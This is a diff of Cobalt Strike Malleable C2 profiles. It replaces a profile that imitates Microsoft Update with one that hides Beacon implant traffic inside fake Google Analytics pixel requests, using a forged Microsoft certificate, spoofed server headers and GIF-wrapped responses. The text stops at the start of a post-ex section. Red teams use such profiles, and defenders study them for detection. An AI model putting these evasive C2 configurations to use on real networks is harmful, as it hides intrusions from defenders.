@@ -1,117 +1,87 @@
-# This profile has been modified to use with the Malleable C2 Profile Randomizer
+#webbug_getonly
 
-#
-# Microsoft Update
-# 
-# Author: @bluscreenofjeff
-#
-
-#set https cert info
-#information assumed based on other Microsoft certs
-https-certificate {
-    set CN       "www.windowsupdate.com"; #Common Name
-    set O        "Microsoft Corporation"; #Organization Name
-    set C        "US"; #Country
-    set L        "Redmond"; #Locality
-    set OU       "Microsoft IT"; #Organizational Unit Name
-    set ST       "WA"; #State or Province
-    set validity "365"; #Number of days the cert is valid for
-}
-
-#default Beacon sleep duration and jitter
-set sleeptime "7300";
-set jitter    "13";
+set sleeptime "1500";
 
 set host_stage "true";
 
-#default useragent for HTTP comms
-set useragent "Windows-Update-Agent/10.0.06160.79627 Client-Protocol/1.40";
-
-#IP address used to indicate no tasks are available to DNS Beacon
-set dns_idle "8.8.4.4";
-
-#Force a sleep prior to each individual DNS request. (in milliseconds)
-set dns_sleep "0";
-
-#Maximum length of hostname when uploading data over DNS (0-255)
-set maxdns    "246";
-
 http-get {
+	set uri "/___utm.gif";
+	client {
+		parameter "utmac" "UA-9038081-2";
+		parameter "utmcn" "1";
+		parameter "utmcs" "ISO-8859-1";
+		parameter "utmsr" "1280x1024";
+		parameter "utmsc" "32-bit";
+		parameter "utmul" "en-US";
+		
+		header "Host" "Google Bot";
+		
+		metadata {
+			base64url;
+			prepend "__utma";
+			parameter "utmcc";
+		}
+	}
 
-    set uri "/c/msdownload/update/others/2021/04/3883707_";
+	server {
+		header "Content-Type" "image/gif";
 
-    client {
+		output {
+			# hexdump pixel.gif
+			# 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
+			# 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
+			# 0000020 01 00 01 00 00 02 01 44 00 3b 
+			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
+			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
+			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
 
-        header "Accept" "*/*";
-        header "Host" "download.windowsupdate.com";
-        
-        #session metadata
-        metadata {
-            base64url;
-            append ".cab";
-            uri-append;
-        }
-    }
-
-
-    server {
-        header "Content-Type" "application/vnd.ms-cab-compressed";
-        header "Server" "Microsoft-IIS/8.5";
-        header "MSRegion" "N. America";
-        header "Connection" "keep-alive";
-        header "X-Powered-By" "ASP.NET";
-
-        #Beacon's tasksset host_stage "true";
-        output {
-
-            print;
-        }
-    }
+			print;
+		}
+	}
 }
 
 http-post {
-    
-    set uri "/c/msdownload/update/others/2021/04/6642982_";
-    set verb "GET";
+	set uri "/__utm.gif";
+	set verb "GET";
+	client {
+		id {
+			prepend "UA-499";
+			append "-2";
+			parameter "utmac";
+		}
 
-    client {
+		parameter "utmcn" "1";
+		parameter "utmcs" "ISO-8859-1";
+		parameter "utmsr" "1280x1024";
+		parameter "utmsc" "32-bit";
+		parameter "utmul" "en-US";
+		
+		header "Host" "Google Bot";
+		
+		output {
+			base64url;
+			prepend "__utma";
+			parameter "utmcc";
+		}
+	}
 
-        header "Accept" "*/*";
+	server {
+		header "Content-Type" "image/gif";
 
-        #session ID
-        id {
-            prepend "download.windowsupdate.com/c/";
-            header "Host";
-        }
-
-
-        #Beacon's responses
-        output {
-            base64url;
-            append ".cab";
-            uri-append;
-        }
-    }
-
-    server {
-        header "Content-Type" "application/vnd.ms-cab-compressed";
-        header "Server" "Microsoft-IIS/8.5";
-        header "MSRegion" "N. America";
-        header "Connection" "keep-alive";
-        header "X-Powered-By" "ASP.NET";
-
-        #empty
-        output {
-            print;
-        }
-    }
+		output {
+			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
+			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
+			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
+			print;
+		}
+	}
 }
 
-#change the stager server
+# dress up the staging process too
 http-stager {
-    server {
-        header "Content-Type" "application/vnd.ms-cab-compressed";
-    }
+	server {
+		header "Content-Type" "image/gif";
+	}
 }
 
 post-ex {
